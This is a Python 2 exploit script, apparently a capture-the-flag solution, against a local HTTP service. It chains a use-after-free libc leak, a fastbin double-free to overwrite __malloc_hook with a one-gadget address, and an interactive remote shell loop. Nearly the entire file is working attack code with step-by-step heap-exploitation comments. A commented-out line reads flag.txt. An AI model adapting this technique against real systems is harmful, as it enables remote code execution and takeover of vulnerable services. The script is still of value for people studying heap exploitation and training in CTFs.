import socket
import re
import struct

TARGET = ('127.0.0.1', 31337)

def send_request(s, path, content):
    req = "POST /{} HTTP/1.1\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}".format(path, len(content), content)
    s.send(req)


def read_response(s):
    bufsize = 1024
    data = s.recv(bufsize)
    body_start = data.find('\r\n\r\n') + 4 # + 4 because \r\n\r\n
    headers = data[:body_start]
    data = data[body_start:]
    
    if headers.find('HTTP/1.1 200 OK') == -1:
        exit('Bad response:\n\n' + headers)

    re_obj = re.search(r'Content-Length: (\d+)', headers)    
    if re_obj:
        content_size = int(re_obj.group(1))
        remaining = content_size # - len(headers)

        while len(data) < remaining:
            data += s.recv(bufsize)
        
        return data
    else:
        exit("Couldn't find Content-Length:\n\n" + headers)

def request(s, path, content):
    send_request(s, path, content)
    return read_response(s)
        
def add(s, data):
    return request(s, 'add', 'desc={}'.format(data))

def sub(s, item):
    return request(s, 'sub', 'item={}'.format(item))

def inc(s, item):
    return request(s, 'inc', 'item={}'.format(item))

def pause():
    print
    raw_input('Press any key')
    print


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(TARGET)

# > 160  to avoid being in fastbin
# in malloc.c
# MAX_FAST_SIZE (80 * SIZE_SZ / 4), where
# SIZE_SZ is INTERNAL_SIZE_SZ, which in its turn is size_t
# which on a 64 bit Intel should be 160?????
# 0x100 should be fine

add(s, 'A' * 0x100) # ptr = malloc(0xB0)
sub(s, 0) # free(ptr)

data = inc(s, 0)

re_obj = re.search(r'<div class="row"><div class="col-md-8">.+?src="img/(.+?)"', data)
if not re_obj:
    exit("Couldn't leak libc")
    
addr_str = re_obj.group(1) + '\x00\x00'
unsorted_bin_ptr = struct.unpack('<Q', addr_str)[0]
print 'unsorted bin is at', hex(unsorted_bin_ptr)
# On local machine: 0x000078d67e3be678 - 0x78d67e019000 = 0x3a5678
libc_base = unsorted_bin_ptr - 0x3a5678
print 'libc is at', hex(libc_base)


size = 0x60


# Since ITEMS[0] points at a freed memory the pointer
# will be re-used, new value will be written there and
# the program will think that it must increment ITEMS[0]
# as a result we'll have to decrement this allocation twice
# to free.

add(s, 'A' * size) # chunk0 = malloc(0x70)


add(s, 'B' * size) # chunk1 = malloc(0x70)

sub(s, 0) # now's only one left
sub(s, 0) # free(chunk0)

sub(s, 1) # free(chunk1) to avoid double-free detection

inc(s, 0) # increment item 0 to be able to trigger free
sub(s, 0) # free(chunk0) again

# At this point we have [] -> chunk0 -> chunk1 -> chunk0

malloc_hook = libc_base + 0x3a5610
print '__malloc_hook is at', hex(malloc_hook)

# 0x7d2ba05ee5ed = __malloc_hook - 0x23
# data at the address above should look like this:
# 0x2ba05ea94000007d	0x000000000000007d
# Where 7d will taken as the chunk size < 0x80 (???) still
# in fastbin?

# overwrite fd (forward pointer of the chunk with our fake
# free chunk
# the size of this chunk is 0x7d, 0x10 of which are size of the
# previous chunk and size of the chunk, so we need a memory
# size 0x6d??

# pause()
# Address is 6 bytes, so we have 2 extra null-bytes
# which will cut our request... luckily the server
# supports %XX hex characters, e.g. %00
fake_chunk = struct.pack('<Q', malloc_hook - 0x23)[:6] + "%00%00"
add(s, fake_chunk + 'C' * (size - 20))



add(s, 'A' * size) # remove chunk1 from the fastbin
add(s, 'A' * size) # remove chukn0 (double-freed) from the fastbin

# Next malloc will give us write primitive to __malloc_hook - 0x23
# size 0x7d



# We're at __malloc_hook - 0x23, but first 0x10 bytes are prev chunk
# size and size chunk, so we need to write our "gadget" into
# addr + 0x13, and don't forget padding to make size 0x70


#
sh_call = libc_base + 0xd6e77
print 'Gadget is at', hex(sh_call)
# gadget = struct.pack('<Q', sh_call)[:6] + '%00%00'
gadget = ''
for b in struct.pack('<Q', sh_call):
    gadget += '%%%.2x' % ord(b)

print gadget


add(s, 'A' * 0x13 + gadget + 'D' * (size - 45))


# Next malloc should trigger our payload, but we'll have to
# send the request "manually" because we'll get the shell
# add(s, 'A' * size)

send_request(s, 'add', 'desc={}'.format('A' * size))

# print s.recv(1024)
# s.send('/bin/cat flag.txt\n')
# print s.recv(1024)


while True:
    inp = raw_input("shell$: ")
    if inp == '.exit':
        break
    s.send(inp + '\n')
    print s.recv(4096)

    

